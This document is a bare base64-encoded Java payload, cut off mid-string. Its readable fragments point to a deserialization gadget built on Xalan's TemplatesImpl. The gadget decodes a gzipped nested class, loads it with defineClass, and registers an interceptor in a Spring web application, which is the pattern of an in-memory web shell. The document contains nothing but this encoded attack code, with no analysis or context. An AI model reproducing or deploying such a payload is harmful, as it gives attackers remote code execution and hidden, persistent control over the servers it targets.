uZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAEsBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABxUZW1wbGF0ZUltcGxDbGFzc0xvYWRlci5qYXZhDAAVABYBAE5jb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsJFRyYW5zbGV0Q2xhc3NMb2FkZXIMAEwATQEAD2phdmEvbGFuZy9DbGFzcwwATgBPBwBQDABRAFIHAFMMAFQAVwEztHl2NjZ2Z0FBQURFQlNBRUFJbU52YlM5bVlYTjBaWEo0Yld3dmFtRmphM052Ymk5bVppOUdhV3hsVlhScGJITUhBQUVCQUVCamIyMHZjM1Z1TDI5eVp5OWhjR0ZqYUdVdmVHRnNZVzR2YVc1MFpYSnVZV3d2ZUhOc2RHTXZjblZ1ZEdsdFpTOUJZbk4wY21GamRGUnlZVzV6YkdWMEJ3QURBUUFOWjJWMFZYSnNVR0YwZEdWeWJnRUFGQ2dwVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3QVFBRVEyOWtaUUVBRDB4cGJtVk9kVzFpWlhKVVlXSnNaUUVBRWt4dlkyRnNWbUZ5YVdGaWJHVlVZV0pzWlFFQUJIUm9hWE1CQUNSTVkyOXRMMlpoYzNSbGNuaHRiQzlxWVdOcmMyOXVMMlptTDBacGJHVlZkR2xzY3pzQkFBSXZLZ2dBREFFQURHZGxkRU5zWVhOelRtRnRaUUVBTTJOdmJTNW1ZWE4wWlhKNGJXd3VhbUZqYTNOdmJpNUJZbk4wY21GamRFMWhkR05vWlhKTWRtbEpiblJsY21ObGNIUnZjZ2dBRHdFQUQyZGxkRUpoYzJVMk5GTjBjbWx1WndFQUNrVjRZMlZ3ZEdsdmJuTUJBQk5xWVhaaEwybHZMMGxQUlhoalpYQjBhVzl1QndBVEFRQVFhbUYyWVM5c1lXNW5MMU4wY21sdVp3Y0FGUUVKc0VnMGMwbEJRVUZCUVVGQlFVRktNVmdyTTJOVWVIaFlLMUpuSzNaclNsZFJhVUZEVnpOUldrbEJOVVpyYzBGb01tSk1RMVJuUnpCTlpISkRaRVpKUjNBMEwxTjRhMnRoVjNOTWQzSmtiR015WW5CMVZYQnRiV0k1U20wd1lXUnlNRzVpTlVsRE5sVnJRbEpzUTFFcmJtbzVTV1lyVVhvek9YQmxhek4xTjB4M1VUWTFlbVYxZVhwUE0xQnVlbkl4TTNaMmRtUlBOblF2TDNWbE9USjNRV1Y0WkRoR1QzSlFiV0pEY1hZeU5EWXdlbk1yVjFWdFpqRTNTWGgwUjNGdUsycFBNVmxsZEZsYU1EVXhjMUZXY1dwak9GVlNaM2x3V2xkWVdrMVRORTFSTWtod1YyNDVUbFJLWkRKWlZHY3lWMlJPYzJWT1psZGpOVXBLWm05TlpUQndiRTR5TWxOdllUQXpiRXh1TlZoNmNHcFhWRzF3WlZwc1F6SjBkVnBLTUZWMk16Sm5jRVZrTVc4eFkxTldiM0kzUVZsR2VFUlNkSGcyWTBkRmNVOXlTRkJSU2tKQllrNXVRbFJaVUVadk1EVklhR3hPYVU5MFZUTnhiVkpGYkRBeFRYcHhjRkZ1WkV0eGNEVlVVbWgzUTJ0V1lqUk1TRkl2SzA5SlpFTlplVUZ5Tm5CQldVaHRiazE2Vkc5U2RVVjNTR0pIVG1wTGVVNXliMGszYzFBNVdWRlJVVVpYYURaMlIyZFZibE5qUmxkMVQzSTVWSGxaSzJoSlZHUktRMngwV0ZoWFNUTm5RVmMxVnpGR1owWXZVRVJIYURWeE1YRXphV0YzY1ZkNFNrUjZlVUp1VDJablprSXpZV2QxVDFWVk9FNDRjRVF6UWxOWWJYVkpiVEp1WWpCTk1YVXlkMkYwZFhoaVJuTXZWRzFpVFhrMkwxRnNibWhZV1dOc1l6WmtSalJvVmtSUlRrUlVjMFZPUm5aaFRtbGpRMDg1WmpNMFIyOVJWV0lyV2s5aGRYazFlSEZ5VDAxV1UyRnJkM1pWTnpZeGRHcFdja3hTUkRjeFIwTjRla2g0VVhKc2JHVTRRVXRRWmsxb1ZFTnZVM015YTJ0RlRtOWhiV1J0V2paTGJtaHJWa1Y0WVVFMFJFRlFWMjFJY0VkSGQwNVhZVVpETVVwc1lWcDZZMWh5YTJvM1UycFRUVE4yTnpCTVJVcFFjVkZGWkc0cmIzbEVWVGg1YzFKUFV6Sm1XWFJUZVhkS056ZFhZa3RMVW5Bd05UQk9aVTFCU0dsT1VIWmhaMjA1UmtwR1VuUkVhbEpZUWxFMFREZFdkWHBVTUVWeGFYTmhWR2cyTUZORGJESXhZWGQwUzBKaVlWSlhWV3RhV0UxbVVWTlFORFJyZHl0clFUSm9lR3htWldsdVprUTRWVlJITWxVNFoybFFiMVk0UjNocFR6WXZiUzlTYUROVE5GRlRkekZJZDNob1ExZDNhRGRwVUVGTFZHMW5XVXBzZGt0R1YySXJXVWg0ZEZGb2NIZGtTekJ2WjNGa2QyOW9hMnBIUVRCb1NITkpkVEZzYzJ4b1IyWlpSbk52YzNOM2FFOWxkbWxyUWxJM09ETTRabEZqU25CdlRWSm5XRmRJUzNoUlYxbGhVazFUVTFCWlRsQk9SMDFEYTNwNFRDOHhRVFpvUzJ4aFNXRXhhWFZ2V2xCTmJtNUZaSE5UZDBoYU1uZERlVlJYZW1ZM2NVdHZibWN3TDJoTlIwb3JRMHh5UW1wb1dVcGtiSFJzVlZkdFdYUTJXbmxSUXpKdVQwNU1SR3BvVDJodldVMUhVbnBJYzJkdWNHZGhhVVZCYVhKNFNUZzNabGN5UW04M1pEZHNUVTFKZDJWWFlqQkRNVTV4VlRZMGJXNWhUV3gxZUdsek5VTnBhelZqTVZKS2JWWlVla2REZFVvMWNVZG5iMlYzU0ZWbGRXMVhaVXROSzJGelJVODBlSHB2V2xCUGNWSlJNWHBCZG1OMU4yWmtZWEJWUW5OeVdsWTJSbm95VUdoVVJHMDRaR3QzVlRremFWWmtha3BYYjFjeFRHMHdjbTF4YlVKVGFqUjJURnB1ZWpGeWFuWmxZbmxuYVZCelJtZFhNazVrVkZJNE1GY3dNbVZyTldSU1owbFFlRUowVnpVMVpuZFZhR2QyTkhOME1HNWxiblZQYVhGNk4yZFhNbkpXUmpaV1UzRXJhWEJrVm5CTEszZEpLMWhOV1RCV1JFd3ZSWGxWV21Wb1YzWjNOblp4UjBFdlYxbEZSMnRLU3pka2RXdHFVMGh1TnpsS2JWcFNSREZSYm1kT016RkZaMlpLWlRKWFRtZzJlVlpaTTJKTFRrZElPRWd6T0VsaVF5OTJjM001Ym5GcWRERlZNR0oxVWtWeVUyMXFNamRMTjJsM1dHUTJTRFpsTURZemRYQllOaXMyY25KbmMyazVSRlU0UlRWV1ZWbGhUblJtTkRCaFIwdDJiVkJCZEZKeVEwd3JaM0ppT1ZrMk5pczBUbVYxUVZOWldEWkdXRFoyZWk5alluSlZRamRKVm1kb2RuTjZaRkJ5VmtoWU9FUjFVRUl5VUZOTFdtYzFaMU5OVG5aTGVtUjBkSGwyU21aTmJFRndZbmxNUkVOQmVTOXBPVU4xUVV0SFZESXhSbXhqVGxaM1ZtRXhkSFYxTkZZeWFWZHFWRzE2UW10bEsxWkRSSFpFVVhjeVZFUk9NVE5CT1dwRUsybFRiazVsZFd0TE5GRmhOMXBHWVU1cWRHMW9iazkzWWpZd01FNU1TRU5ST0RkM2JFVlFSREpRTWxOSU9HbFRia28xYm5FMmRTOUxaRmhSWmpGbk1USmtNMkp0WlVWSE5GUXhkRTV6YW5aMk5uQTJXR2hvU0VOSU9XZGtibFJMZGtGSVdDOUdUSFpKZDBGSmNtYzFOVTVPYkZJclYxRnNNUzgzY25aSVpsRmpOVWx0V0RVelRWUmFSVGxVTXpoaU1IQXlaVFYyZGpjeVNVeFdZelU0VTBoTlduaE9WbWRHV1RBNE4yNU9WVEJKUlRsM1JIVTJSalZ6TlhKd1VWZ3dXVEZWT0RsUlVqSnRNVXBPYzFoRlZYUkhMek4zWkhBMVRGSjJNWHBJTDIxVU1HSTVaSGcyU2pJMk5XSkRjblIzVUdKeldFOWFPVnBoTmpsU1drdDBkR1Z6ZERsaGMwUXhSa2g0WWswNWRWbHBVR0pIZWpoWmVsUjRjMGR6T0RSdE1uSkhVbVkwUzBJMmEwSnJNa3RRU1N0dlZWaGhkRkJZYTA0ck1pdHBNalJrTHpSUE1qZEZkelJQVmxoSU5GUmllbVZtYUU5RVFYSXlRbGQ0YVdGWVRWTjRNMjFCYzBkRU1VODBXbWRtV25wbll6TXhjMlpRYURCTU1VMWhRalpOWkhBMFRsSk9VRTkwU0RsTWEySjVVRkV5ZUZweFEzUTFRMkpXVDBseFEzUklia1pxUmxSb1dHdE1kbk5zYTBaYVZYRlFjbVZKZWpobFlXdHRaRzhyV1VwQlJsWXJOV2RoT1ZZNFlUQnhXSEV6YVRsV2FYZHBhQ3RqZFZsb1oySTRRaTlQV0VOYVNqbHRSbE0zYUVORFVETjFkVmgxV2tWMVFWSlRhRkE0VXpkS1puUnFUemRsZWtoTkwwbzVhVFZ1VjJ0VlRVSXJkazFEWmtkd1pqUnZXRXRHUjJ4bVVtaFlabEkzWlVrd1ZFTjNVemRKTmpjNFFrRTFZMUZCVEhoUVFtaHpjVmRCVVZkTE5XMHhaMUp4V0hGTGNtMUZVR1pSYkROR1QyTXJibnAwU3pCeFpXWlFiRlZYTDFBdlEwWlJNRGNyWlZCclZHTTBWa3N6WTFOa1ptSlZSM1p4Ym1GVVNFbHNXbVpGWVZCVFdFNHpRbmhpUnk4d2RDdEpUMHhzV0hob056RTRkakZRUmpSMlp5dDNhRXM1UjFoblpqZzFVQ3RoUml0aFV5OXpORTlVWm5CVU0wczRaVUZrZG1WbUsycEdNMFkwVUVoeVRFNVZTMnRsWjA5NFowNXlOQzkyUzA1elkwRTJUelJzYmlzeFYxaDFiMDAwZUdocFVEZzNjVFZWUldZeFFVVTRUVE56WXl0SVIySk9TRVZGWWl0eGF6TlJjekJDWVdnM1JrZEpiVm8xZFhnMU5HNWxRbXRvWkhodmJ6VnRSelZJTlc5WmRFbERSUzlwVWk5cGVDdHpTV2hTYTI5WE5FMDNUMjExZHpRM1pqaEZVRFpWWlRCalJGQXpRM0l4TUdSTVVETlNTbFJoUTJKbkx6UkNUMlpDY2xsMk9UWkRTVXMwWmpSQ1FVTjBWRzF1Y25WNlpsZEJOREl2WjNaUGNHaHdVRmRuTkVGQlFUMDlDQUFYQVFBR1BHbHVhWFErQVFBVktFeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bFdEQUFaQUJvS0FCWUFHd0VBQXlncFZnRUFCMk52Ym5SbGVIUUJBQkpNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHNCQUF0cGJuUmxjbU5sY0hSdmNnd0FHUUFkQ2dBRUFDRUJBQXBuWlhSRGIyNTBaWGgwQVFBVUtDbE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc01BQ01BSkFvQUFnQWxBUUFPWjJWMFNXNTBaWEpqWlhCMGIzSU1BQ2NBSkFvQUFnQW9BUUFPWVdSa1NXNTBaWEpqWlhCMGIzSUJBQ2NvVEdwaGRtRXZiR0Z1Wnk5UFltcGxZM1E3VEdwaGRtRXZiR0Z1Wnk5UFltcGxZM1E3S1ZZTUFDb0FLd29BQWdBc0FRQVRhbUYyWVM5c1lXNW5MMFY0WTJWd2RHbHZiZ2NBTGdFQUVYSmxjWFZsYzNSQmRIUnlhV0oxZEdWekFRQUxhSFIwY0hKbGNYVmxjM1FCQUFkelpYTnphVzl1QVFBT2MyVnlkbXhsZEVOdmJuUmxlSFFCQUJOaGNIQnNhV05oZEdsdmJrTnZiblJsZUhSekFRQVpUR3BoZG1FdmRYUnBiQzlNYVc1clpXUklZWE5vVTJWME93RUFFbUZ3Y0d4cFkyRjBhVzl1UTI5dWRHVjRkQUVBQzJOc1lYTnpURzloWkdWeUFRQVhUR3BoZG1FdmJHRnVaeTlEYkdGemMweHZZV1JsY2pzQkFCVnFZWFpoTDJ4aGJtY3ZRMnhoYzNOTWIyRmtaWElIQURrQkFCQnFZWFpoTDJ4aGJtY3ZUMkpxWldOMEJ3QTdBUUFOVTNSaFkydE5ZWEJVWVdKc1pRRUFFR3BoZG1FdmJHRnVaeTlVYUhKbFlXUUhBRDRCQUExamRYSnlaVzUwVkdoeVpXRmtBUUFVS0NsTWFtRjJZUzlzWVc1bkwxUm9jbVZoWkRzTUFFQUFRUW9BUHdCQ0FRQVZaMlYwUTI5dWRHVjRkRU5zWVhOelRHOWhaR1Z5QVFBWktDbE1hbUYyWVM5c1lXNW5MME5zWVhOelRHOWhaR1Z5T3d3QVJBQkZDZ0EvQUVZQkFEeHZjbWN1YzNCeWFXNW5abkpoYldWM2IzSnJMbmRsWWk1amIyNTBaWGgwTG5KbGNYVmxjM1F1VW1WeGRXVnpkRU52Ym5SbGVIUkliMnhrWlhJSUFFZ0JBQWxzYjJGa1EyeGhjM01CQUNVb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tVeHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN0RBQktBRXNLQURvQVRBRUFGR2RsZEZKbGNYVmxjM1JCZEhSeWFXSjFkR1Z6Q0FCT0FRQU1hVzUyYjJ0bFRXVjBhRzlrQVFBNEtFeHFZWFpoTDJ4aGJtY3ZUMkpxWldOME8weHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc01BRkFBVVFvQUFnQlNBUUFLWjJWMFVtVnhkV1Z6ZEFnQVZBRUFDbWRsZEZObGMzTnBiMjRJQUZZQkFCRm5aWFJUWlhKMmJHVjBRMjl1ZEdWNGRBZ0FXQUVBUW05eVp5NXpjSEpwYm1kbWNtRnRaWGR2Y21zdWQyVmlMbU52Ym5SbGVIUXVjM1Z3Y0c5eWRDNVhaV0pCY0hCc2FXTmhkR2x2YmtOdmJuUmxlSFJWZEdsc2N3Z0FXZ0VBR0dkbGRGZGxZa0Z3Y0d4cFkyRjBhVzl1UTI5dWRHVjRkQWdBWEFFQUQycGhkbUV2YkdGdVp5OURiR0Z6Y3djQVhnRUFIR3BoZG1GNExuTmxjblpzWlhRdVUyVnlkbXhsZEVOdmJuUmxlSFFJQUdBQkFGMG9UR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdUR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdXMHhxWVhaaEwyeGhibWN2UTJ4aGMzTTdXMHhxWVhaaEwyeGhibWN2VDJKcVpXTjBPeWxNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHNNQUZBQVlnb0FBZ0JqQVFBeGIzSm5Mbk53Y21sdVoyWnlZVzFsZDI5eWF5NWpiMjUwWlhoMExuTjFjSEJ2Y25RdVRHbDJaVUpsWVc1elZtbGxkd2dBWlFFQUMyNWxkMGx1YzNSaGJtTmxEQUJuQUNRS0FGOEFhQWdBTkFFQUJXZGxkRVpXREFCckFGRUtBQUlBYkFFQUYycGhkbUV2ZFhScGJDOU1hVzVyWldSSVlYTm9VMlYwQndCdUFRQUlhWFJsY21GMGIzSUJBQllvS1V4cVlYWmhMM1YwYVd3dlNYUmxjbUYwYjNJN0RBQndBSEVLQUc4QWNnRUFFbXBoZG1FdmRYUnBiQzlKZEdWeVlYUnZjZ2NBZEFFQUJHNWxlSFFNQUhZQUpBc0FkUUIzQVFBMWIzSm5Mbk53Y21sdVoyWnlZVzFsZDI5eWF5NTNaV0l1WTI5dWRHVjRkQzVYWldKQmNIQnNhV05oZEdsdmJrTnZiblJsZUhRSUFIa0JBQWhuWlhSRGJHRnpjd0VBRXlncFRHcGhkbUV2YkdGdVp5OURiR0Z6Y3pzTUFIc0FmQW9BUEFCOUFRQVFhWE5CYzNOcFoyNWhZbXhsUm5KdmJRRUFGQ2hNYW1GMllTOXNZVzVuTDBOc1lYTnpPeWxhREFCL0FJQUtBRjhBZ1FFQUlHcGhkbUV2YkdGdVp5OURiR0Z6YzA1dmRFWnZkVzVrUlhoalpYQjBhVzl1QndDREFRQXJhbUYyWVM5c1lXNW5MM0psWm14bFkzUXZTVzUyYjJOaGRHbHZibFJoY21kbGRFVjRZMlZ3ZEdsdmJnY0FoUUVBSDJwaGRtRXZiR0Z1Wnk5T2IxTjFZMmhOWlhSb2IyUkZlR05sY0hScGIyNEhBSWNCQUNCcVlYWmhMMnhoYm1jdlNXeHNaV2RoYkVGalkyVnpjMFY0WTJWd2RHbHZiZ2NBaVFFQUUycGhkbUV2YkdGdVp5OVVhSEp2ZDJGaWJHVUhBSXNCQUFsamJHRjZla0o1ZEdVQkFBSmJRZ0VBQzJSbFptbHVaVU5zWVhOekFRQWFUR3BoZG1FdmJHRnVaeTl5Wldac1pXTjBMMDFsZEdodlpEc0JBQVZqYkdGNmVnRUFFVXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBUUFCWlFFQUZVeHFZWFpoTDJ4aGJtY3ZSWGhqWlhCMGFXOXVPd3dBRGdBR0NnQUNBSlVNQUJFQUJnb0FBZ0NYQVFBTVpHVmpiMlJsUW1GelpUWTBBUUFXS0V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3lsYlFnd0FtUUNhQ2dBQ0FKc0JBQTVuZW1sd1JHVmpiMjF3Y21WemN3RUFCaWhiUWlsYlFnd0FuUUNlQ2dBQ0FKOElBSThIQUk0QkFCRnFZWFpoTDJ4aGJtY3ZTVzUwWldkbGNnY0Fvd0VBQkZSWlVFVU1BS1VBa2drQXBBQ21BUUFSWjJWMFJHVmpiR0Z5WldSTlpYUm9iMlFCQUVBb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN1cweHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN0tVeHFZWFpoTDJ4aGJtY3ZjbVZtYkdWamRDOU5aWFJvYjJRN0RBQ29BS2tLQUY4QXFnRUFHR3BoZG1FdmJHRnVaeTl5Wldac1pXTjBMMDFsZEdodlpBY0FyQUVBRFhObGRFRmpZMlZ6YzJsaWJHVUJBQVFvV2lsV0RBQ3VBSzhLQUswQXNBRUFCM1poYkhWbFQyWUJBQllvU1NsTWFtRjJZUzlzWVc1bkwwbHVkR1ZuWlhJN0RBQ3lBTE1LQUtRQXRBRUFCbWx1ZG05clpRRUFPU2hNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHRiVEdwaGRtRXZiR0Z1Wnk5UFltcGxZM1E3S1V4cVlYWmhMMnhoYm1jdlQySnFaV04wT3d3QXRnQzNDZ0N0QUxnQkFCWmhZbk4wY21GamRFaGhibVJzWlhKTllYQndhVzVuQVFBVFlXUmhjSFJsWkVsdWRHVnlZMlZ3ZEc5eWN3RUFGVXhxWVhaaEwzVjBhV3d2UVhKeVlYbE1hWE4wT3dFQUZreHZZMkZzVm1GeWFXRmliR1ZVZVhCbFZHRmliR1VCQUNsTWFtRjJZUzkxZEdsc0wwRnljbUY1VEdsemREeE1hbUYyWVM5c1lXNW5MMDlpYW1WamREcytPd0VBQjJkbGRFSmxZVzRJQUw4QkFCeHlaWEYxWlhOMFRXRndjR2x1WjBoaGJtUnNaWEpOWVhCd2FXNW5DQURCQ0FDN0FRQVRhbUYyWVM5MWRHbHNMMEZ5Y21GNVRHbHpkQWNBeEFFQUEyRmtaQUVBRlNoTWFtRjJZUzlzWVc1bkwwOWlhbVZqZERzcFdnd0F4Z0RIQ2dERkFNZ0JBQXhrWldOdlpHVnlRMnhoYzNNQkFBZGtaV052WkdWeUFRQUhhV2R1YjNKbFpBRUFDV0poYzJVMk5GTjBjZ0VBRWt4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3dFQUZFeHFZWFpoTDJ4aGJtY3ZRMnhoYzNNOEtqNDdBUUFXYzNWdUxtMXBjMk11UWtGVFJUWTBSR1ZqYjJSbGNnZ0EwQUVBQjJadmNrNWhiV1VNQU5JQVN3b0FYd0RUQVFBTVpHVmpiMlJsUW5WbVptVnlDQURWQVFBSloyVjBUV1YwYUc5a0RBRFhBS2tLQUY4QTJBRUFFR3BoZG1FdWRYUnBiQzVDWVhObE5qUUlBTm9CQUFwblpYUkVaV052WkdWeUNBRGNBUUFHWkdWamIyUmxDQURlQVFBT1kyOXRjSEpsYzNObFpFUmhkR0VCQUFOdmRYUUJBQjlNYW1GMllTOXBieTlDZVhSbFFYSnlZWGxQZFhSd2RYUlRkSEpsWVcwN0FRQUNhVzRCQUI1TWFtRjJZUzlwYnk5Q2VYUmxRWEp5WVhsSmJuQjFkRk4wY21WaGJUc0JBQVoxYm1kNmFYQUJBQjlNYW1GMllTOTFkR2xzTDNwcGNDOUhXa2xRU1c1d2RYUlRkSEpsWVcwN0FRQUdZblZtWm1WeUFRQUJiZ0VBQVVrQkFCMXFZWFpoTDJsdkwwSjVkR1ZCY25KaGVVOTFkSEIxZEZOMGNtVmhiUWNBNmdFQUhHcGhkbUV2YVc4dlFubDBaVUZ5Y21GNVNXNXdkWFJUZEhKbFlXMEhBT3dCQUIxcVlYWmhMM1YwYVd3dmVtbHdMMGRhU1ZCSmJuQjFkRk4wY21WaGJRY0E3Z29BNndBaEFRQUZLRnRDS1ZZTUFCa0E4UW9BN1FEeUFRQVlLRXhxWVhaaEwybHZMMGx1Y0hWMFUzUnlaV0Z0T3lsV0RBQVpBUFFLQU84QTlRRUFCSEpsWVdRQkFBVW9XMElwU1F3QTl3RDRDZ0R2QVBrQkFBVjNjbWwwWlFFQUJ5aGJRa2xKS1ZZTUFQc0EvQW9BNndEOUFRQUxkRzlDZVhSbFFYSnlZWGtCQUFRb0tWdENEQUQvQVFBS0FPc0JBUUVBQlhObGRFWldBUUE1S0V4cVlYWmhMMnhoYm1jdlQySnFaV04wTzB4cVlYWmhMMnhoYm1jdlUzUnlhVzVuTzB4cVlYWmhMMnhoYm1jdlQySnFaV04wT3lsV0FRQUVkbUZ5TUFFQUJIWmhjakVCQUFOMllXd0JBQVJuWlhSR0FRQS9LRXhxWVhaaEwyeGhibWN2VDJKcVpXTjBPMHhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxNYW1GMllTOXNZVzVuTDNKbFpteGxZM1F2Um1sbGJHUTdEQUVJQVFrS0FBSUJDZ0VBRjJwaGRtRXZiR0Z1Wnk5eVpXWnNaV04wTDBacFpXeGtCd0VNQVFBRGMyVjBEQUVPQUNzS0FRMEJEd0VBQTI5aWFnRUFDV1pwWld4a1RtRnRaUUVBQldacFpXeGtBUUFaVEdwaGRtRXZiR0Z1Wnk5eVpXWnNaV04wTDBacFpXeGtPd29CRFFDd0FRQURaMlYwQVFBbUtFeHFZWFpoTDJ4aGJtY3ZUMkpxWldOME95bE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc01BUllCRndvQkRRRVlBUUFlYW1GMllTOXNZVzVuTDA1dlUzVmphRVpwWld4a1JYaGpaWEIwYVc5dUJ3RWFBUUFnVEdwaGRtRXZiR0Z1Wnk5T2IxTjFZMmhHYVdWc1pFVjRZMlZ3ZEdsdmJqc0JBQkJuWlhSRVpXTnNZWEpsWkVacFpXeGtBUUF0S0V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3lsTWFtRjJZUzlzWVc1bkwzSmxabXhsWTNRdlJtbGxiR1E3REFFZEFSNEtBRjhCSHdFQURXZGxkRk4xY0dWeVkyeGhjM01NQVNFQWZBb0FYd0VpQ2dFYkFCc0JBQXgwWVhKblpYUlBZbXBsWTNRQkFBcHRaWFJvYjJST1lXMWxBUUFCYVFFQUIyMWxkR2h2WkhNQkFCdGJUR3BoZG1FdmJHRnVaeTl5Wldac1pXTjBMMDFsZEdodlpEc0JBQ0ZNYW1GMllTOXNZVzVuTDA1dlUzVmphRTFsZEdodlpFVjRZMlZ3ZEdsdmJqc0JBQ0pNYW1GMllTOXNZVzVuTDBsc2JHVm5ZV3hCWTJObGMzTkZlR05sY0hScGIyNDdBUUFLY0dGeVlXMURiR0Y2ZWdFQUVsdE1hbUYyWVM5c1lXNW5MME5zWVhOek93RUFCWEJoY21GdEFRQVRXMHhxWVhaaEwyeGhibWN2VDJKcVpXTjBPd0VBQm0xbGRHaHZaQUVBQ1hSbGJYQkRiR0Z6Y3djQktRRUFFbWRsZEVSbFkyeGhjbVZrVFdWMGFHOWtjd0VBSFNncFcweHFZWFpoTDJ4aGJtY3ZjbVZtYkdWamRDOU5aWFJvYjJRN0RBRXpBVFFLQUY4Qk5RRUFCMmRsZEU1aGJXVU1BVGNBQmdvQXJRRTRBUUFHWlhGMVlXeHpEQUU2QU1jS0FCWUJPd0VBRVdkbGRGQmhjbUZ0WlhSbGNsUjVjR1Z6QVFBVUtDbGJUR3BoZG1FdmJHRnVaeTlEYkdGemN6c01BVDBCUGdvQXJRRS9DZ0NJQUJzQkFCcHFZWFpoTDJ4aGJtY3ZVblZ1ZEdsdFpVVjRZMlZ3ZEdsdmJnY0JRZ0VBQ21kbGRFMWxjM05oWjJVTUFVUUFCZ29BaWdGRkNnRkRBQnNBSVFBQ0FBUUFBQUFBQUE0QUFRQUZBQVlBQVFBSEFBQUFMUUFCQUFFQUFBQURFZzJ3QUFBQUFnQUlBQUFBQmdBQkFBQUFFQUFKQUFBQURBQUJBQUFBQXdBS0FBc0FBQUFCQUE0QUJnQUJBQWNBQUFBUUFBRUFBUUFBQUFRVEFCQ3dBQUFBQUFBQkFCRUFCZ0FDQUJJQUFBQUVBQUVBRkFBSEFBQUFGd0FEQUFFQUFBQUx1d0FXV1JNQUdMY0FITEFBQUFBQUFBRUFHUUFkQUFJQUJ3QUFBR01BQXdBREFBQUFGU3EzQUNJcXRnQW1UQ3EzQUNsTktpc3N0Z0F0c1FBQUFBSUFDQUFBQUJZQUJRQUFBQjBBQkFBZUFBa0FId0FPQUNBQUZBQWlBQWtBQUFBZ0FBTUFBQUFWQUFvQUN3QUFBQWtBREFBZUFCOEFBUUFPQUFjQUlBQWZBQUlBRWdBQUFBUUFBUUF2QUFFQUl3QWtBQUlBQndBQUFYd0FCd0FIQUFBQWtMZ0FRN1lBUjB3QlRTc1NTYllBVFJKUHVBQlRUaTBTVmJnQVV6b0VHUVFTVjdnQVV6b0ZHUVVTV2JnQVV6b0dLeEpidGdCTkVsMEV2UUJmV1FNckVtRzJBRTFUQkwwQVBGa0RHUVpUdUFCa1RhY0FCRTRzeHdBNEt4Sm10Z0JOdGdCcEVtcTRBRzNBQUc5T0xiWUFjN2tBZUFFQU9nUXJFbnEyQUUwWkJMWUFmcllBZ3BrQUJoa0VUYWNBQkU0c3NBQUNBQWtBVVFCVUFDOEFXUUNLQUkwQUx3QURBQWdBQUFCR0FCRUFBQUFsQUFjQUpnQUpBQ2dBRlFBcEFCMEFLZ0FtQUNzQUx3QXNBRkVBTGdCVUFDMEFWUUF3QUZrQU1nQnJBRE1BZGdBMEFJY0FOUUNLQURnQWpRQTNBSTRBT2dBSkFBQUFYQUFKQUJVQVBBQXdBQjhBQXdBZEFEUUFNUUFmQUFRQUpnQXJBRElBSHdBRkFDOEFJZ0F6QUI4QUJnQnJBQjhBTkFBMUFBTUFkZ0FVQURZQUh3QUVBQUFBa0FBS0FBc0FBQUFIQUlrQU53QTRBQUVBQ1FDSEFCNEFId0FDQUQwQUFBQWNBQVgvQUZRQUF3Y0FBZ2NBT2djQVBBQUJCd0F2QURSQ0J3QXZBQUFTQUFBQUNnQUVBSVFBaGdDSUFJb0FBZ0FuQUNRQUFnQUhBQUFCVkFBR0FBY0FBQUI2dUFCRHRnQkhUQUZOS3lxMkFKYTJBRTIyQUdsTnB3QmpUaXEyQUppNEFKeTRBS0E2QkJJNkVxRUd2UUJmV1FNU29sTlpCTElBcDFOWkJiSUFwMU8yQUtzNkJSa0ZCTFlBc1JrRkt3YTlBRHhaQXhrRVUxa0VBN2dBdFZOWkJSa0V2cmdBdFZPMkFMbkFBRjg2QmhrR3RnQnBUYWNBQlRvRUxMQUFBZ0FKQUJVQUdBQXZBQmtBY3dCMkFJd0FBd0FJQUFBQU5nQU5BQUFBUGdBSEFEOEFDUUJCQUJVQVN3QVlBRUlBR1FCRUFDVUFSUUJEQUVZQVNRQkhBRzBBU0FCekFFb0FkZ0JKQUhnQVRBQUpBQUFBU0FBSEFDVUFUZ0NOQUk0QUJBQkRBREFBandDUUFBVUFiUUFHQUpFQWtnQUdBQmtBWHdDVEFKUUFBd0FBQUhvQUNnQUxBQUFBQndCekFEY0FPQUFCQUFrQWNRQWdBQjhBQWdBOUFBQUFMZ0FEL3dBWUFBTUhBQUlIQURvSEFEd0FBUWNBTC84QVhRQUVCd0FDQndBNkJ3QThCd0F2QUFFSEFJejZBQUVBRWdBQUFBUUFBUUF2QUFFQUtnQXJBQUVBQndBQUFMMEFCd0FGQUFBQU1Dc1N3QVM5QUY5WkF4SVdVd1M5QUR4WkF4TENVN2dBWkU0dEVzTzRBRzNBQU1VNkJCa0VMTFlBeVZlbkFBUk9zUUF